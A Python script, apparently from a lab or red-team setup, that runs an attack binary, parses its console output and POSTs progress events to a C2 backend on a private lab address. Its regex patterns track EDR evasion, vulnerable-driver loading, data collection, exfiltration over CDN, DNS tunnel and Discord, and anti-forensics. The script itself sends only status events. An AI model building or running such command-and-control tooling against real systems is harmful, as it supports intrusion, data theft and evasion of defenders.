#!/usr/bin/env python3
"""
JOCKY C2 Telemetry Agent

Runs a JOCKY binary as a subprocess, captures output in real-time, parses
telemetry events from console output, and sends them immediately to the C2
backend via HTTP POST. Zero external dependencies — uses only stdlib.
"""

import subprocess
import re
import json
import time
import sys
import logging
import argparse
from datetime import datetime, timezone
from pathlib import Path
from urllib.request import Request, urlopen
from urllib.error import URLError

PHASE_MAP = {
    "lpe": -1, "0": 0, "0.5": 0, "1": 1, "2": 2, "3": 3,
    "4": 4, "5": 5, "6": 6, "7": 7, "8": 8, "9": 9,
    "10": 10, "11": 11, "12": 12,
}

PATTERNS = [
    ("phase_start",    re.compile(r"\[\*\]\s+Phase\s+([\d.]+|[A-Z]+):", re.I)),
    ("edr_complete",   re.compile(r"\[\+\]\s+EDR\s+Evasion:\s+(\d+)\s+techniques\s+deployed", re.I)),
    ("model_cached",   re.compile(r"\[\+\]\s+Model\s+cached:\s+(\d+)\s+bytes", re.I)),
    ("data_collected", re.compile(r"\[\+\]\s+Data\s+Collection:\s+(\d+)\s+bytes", re.I)),
    ("driver_try",     re.compile(r"\[BYOVD\]\s+Trying\s+driver:\s+(\S+)", re.I)),
    ("driver_ok",      re.compile(r"\[BYOVD\]\s+Device\s+handle\s*:?\s*OK", re.I)),
    ("driver_fail",    re.compile(r"\[BYOVD\]\s+Device\s+open\s+FAILED\s+\(err=(\d+)\)", re.I)),
    ("svc_fail",       re.compile(r"\[BYOVD\]\s+StartService\s+failed:\s+(\d+)", re.I)),
    ("exfil_cdn",      re.compile(r"\[\+\]\s+CDN\s+exfiltration\s+successful", re.I)),
    ("exfil_dns",      re.compile(r"\[\+\]\s+DNS\s+tunnel\s+exfiltration\s+successful", re.I)),
    ("exfil_discord",  re.compile(r"\[\+\]\s+Discord\s+exfiltration\s+successful", re.I)),
    ("exfil_complete", re.compile(r"\[\+\]\s+Multi-channel\s+exfiltration\s+complete", re.I)),
    ("forensic_done",  re.compile(r"\[\+\]\s+Forensic\s+(?:analysis\s+)?phase\s+complete", re.I)),
    ("antifor_done",   re.compile(r"\[\+\]\s+Anti-forensics\s+complete", re.I)),
    ("exec_complete",  re.compile(r"\[\+\]\s+Execution\s+complete", re.I)),
]

log = logging.getLogger("telemetry")


def now_iso():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def send_event(url, event):
    body = json.dumps(event).encode("utf-8")
    req = Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urlopen(req, timeout=5) as resp:
            log.info(f"  -> sent {event['event_type']} phase={event['phase']} [{resp.status}]")
            return True
    except URLError as e:
        log.warning(f"  -> FAILED to send: {e}")
        return False
    except Exception as e:
        log.warning(f"  -> FAILED to send: {e}")
        return False


def parse_and_send(line, state, c2_url, chain_id):
    ts = now_iso()
    p = state["phase"]

    for name, pattern in PATTERNS:
        m = pattern.search(line)
        if not m:
            continue

        if name == "phase_start":
            label = m.group(1).lower()
            p = PHASE_MAP.get(label, 0)
            state["phase"] = p
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_start",
                     "phase": p, "status": "active", "details": {"raw": line.strip()}}

        elif name == "edr_complete":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
                     "phase": 0, "status": "success", "details": {"techniques": int(m.group(1))}}

        elif name == "model_cached":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
                     "phase": 2, "status": "success", "details": {"bytes": int(m.group(1))}}

        elif name == "data_collected":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "data_collected",
                     "phase": p, "status": "success", "details": {"bytes": int(m.group(1))}}

        elif name == "driver_try":
            state["driver"] = m.group(1)
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "driver_attempt",
                     "phase": p, "status": "pending", "details": {"driver": m.group(1)}}

        elif name == "driver_ok":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "driver_attempt",
                     "phase": p, "status": "success", "details": {"driver": state.get("driver", "unknown")}}

        elif name in ("driver_fail", "svc_fail"):
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "driver_attempt",
                     "phase": p, "status": "failure",
                     "details": {"driver": state.get("driver", "unknown"), "error_code": int(m.group(1))}}

        elif name == "exfil_cdn":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "exfil_sent",
                     "phase": p, "status": "success", "details": {"channel": "cdn"}}
        elif name == "exfil_dns":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "exfil_sent",
                     "phase": p, "status": "success", "details": {"channel": "dns"}}
        elif name == "exfil_discord":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "exfil_sent",
                     "phase": p, "status": "success", "details": {"channel": "discord"}}

        elif name == "exfil_complete":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
                     "phase": 6, "status": "success", "details": {}}
        elif name == "forensic_done":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
                     "phase": 10, "status": "success", "details": {}}
        elif name == "antifor_done":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
                     "phase": 11, "status": "success", "details": {}}
        elif name == "exec_complete":
            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
                     "phase": 12, "status": "success", "details": {}}
        else:
            continue

        send_event(c2_url, event)
        return True

    return False


def find_binary():
    for path in [r"C:\research_chain_windows_production.exe",
                 r"Z:\research_chain_windows_production.exe",
                 "research_chain_windows_production.exe"]:
        try:
            if Path(path).exists():
                return str(Path(path).resolve())
        except Exception:
            pass
    return None


def run_from_stdin(args):
    """Read binary output from stdin (piped mode)."""
    state = {"phase": 0, "driver": None}
    event_count = 0

    for line in sys.stdin:
        line = line.rstrip("\n\r")
        if not line:
            continue
        print(f"  {line}")
        if parse_and_send(line, state, args.c2_url, args.chain_id):
            event_count += 1

    log.info(f"Total events sent: {event_count}")


def run_from_file(filepath, args):
    """Tail a log file in real-time, parsing lines as they appear."""
    state = {"phase": 0, "driver": None}
    event_count = 0
    seen_complete = False

    log.info(f"Tailing: {filepath}")
    log.info("Waiting for output... (start the binary in another window)")

    while not Path(filepath).exists():
        time.sleep(0.2)

    with open(filepath, "r", encoding="utf-8", errors="replace") as f:
        idle_count = 0
        while True:
            line = f.readline()
            if line:
                idle_count = 0
                line = line.rstrip("\n\r")
                if not line:
                    continue
                print(f"  {line}")
                if parse_and_send(line, state, args.c2_url, args.chain_id):
                    event_count += 1
                if "Execution complete" in line or "window closing" in line:
                    seen_complete = True
            else:
                if seen_complete:
                    # Binary finished, drain any remaining lines
                    time.sleep(0.5)
                    remaining = f.readline()
                    if not remaining:
                        break
                idle_count += 1
                time.sleep(0.1)
                # Timeout after 10 min of no output
                if idle_count > 6000:
                    log.warning("No output for 10 minutes, stopping")
                    break

    log.info(f"Total events sent: {event_count}")


def run_subprocess(binary, args):
    """Launch binary as subprocess and capture output."""
    log.info("Launching binary...")
    proc = subprocess.Popen(
        [binary],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        errors="replace",
    )

    state = {"phase": 0, "driver": None}
    event_count = 0

    while True:
        line = proc.stdout.readline()
        if not line and proc.poll() is not None:
            break
        if not line:
            continue
        line = line.rstrip("\n\r")
        if not line:
            continue
        print(f"  {line}")
        if parse_and_send(line, state, args.c2_url, args.chain_id):
            event_count += 1

    exit_code = proc.returncode
    log.info(f"Binary exited with code {exit_code}")
    log.info(f"Total events sent: {event_count}")

    if exit_code == 0 and event_count <= 2:
        log.warning("Very few events captured. Try piped mode instead:")
        log.warning("  Z:\\research_chain_windows_production.exe 2>&1 | python Z:\\telemetry_agent.py --pipe")


def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    parser = argparse.ArgumentParser(description="JOCKY C2 Telemetry Agent")
    parser.add_argument("--binary", type=str, default=None)
    parser.add_argument("--pipe", action="store_true", help="Read binary output from stdin instead of launching it")
    parser.add_argument("--file", type=str, default=None, help="Tail a log file for binary output (real-time)")
    parser.add_argument("--chain-id", type=str, default="research_chain_v4")
    parser.add_argument("--c2-url", type=str, default="http://192.168.56.1:8443/api/telemetry/report")
    args = parser.parse_args()

    log.info(f"C2 URL:   {args.c2_url}")
    log.info(f"Chain ID: {args.chain_id}")

    # Quick connectivity test
    log.info("Testing C2 connectivity...")
    test_ok = send_event(args.c2_url, {
        "timestamp": now_iso(), "chain_id": args.chain_id,
        "event_type": "agent_start", "phase": -1, "status": "active",
        "details": {"mode": "pipe" if args.pipe else "subprocess"}
    })
    if not test_ok:
        log.error("Cannot reach C2 backend! Check that the backend is running.")
        log.error(f"  Tried: {args.c2_url}")
        sys.exit(1)
    log.info("C2 connectivity OK")

    if args.file:
        log.info(f"File tail mode — watching {args.file}")
        run_from_file(args.file, args)
    elif args.pipe:
        log.info("Pipe mode — reading binary output from stdin...")
        run_from_stdin(args)
    else:
        binary = args.binary or find_binary()
        if not binary:
            log.error("Binary not found. Use --binary <path> or --pipe mode")
            sys.exit(1)
        log.info(f"Binary:   {binary}")
        run_subprocess(binary, args)


if __name__ == "__main__":
    main()
